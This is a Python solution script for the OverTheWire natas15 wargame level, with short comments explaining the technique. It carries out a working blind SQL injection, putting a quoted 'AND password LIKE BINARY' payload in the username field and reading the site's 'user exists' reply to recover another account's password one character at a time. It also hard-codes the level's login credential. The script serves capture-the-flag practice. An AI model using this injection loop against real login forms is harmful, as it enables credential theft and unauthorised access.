# natas15 - Blind SQL injection
# The login query only reveals whether a user exists, not any data.
# That true/false response is a side channel: by asking "does the
# password start with these characters?" one character at a time with
# LIKE BINARY, the password is recovered bit by bit.

import requests

u = "http://natas15.natas.labs.overthewire.org/index.php"
a = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")  # natas15 credentials
cs = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

p = ""
while True:
    f = False
    for c in cs:
        # ask: does natas16's password start with p+c ?
        pl = f'natas16" AND password LIKE BINARY "{p+c}%" #'
        r = requests.get(u, params={"username": pl}, auth=a)
        if "This user exists" in r.text:
            p += c
            print(p)
            f = True
            break
    if not f:      # no character matched -> password fully recovered
        break

print("natas16:", p)
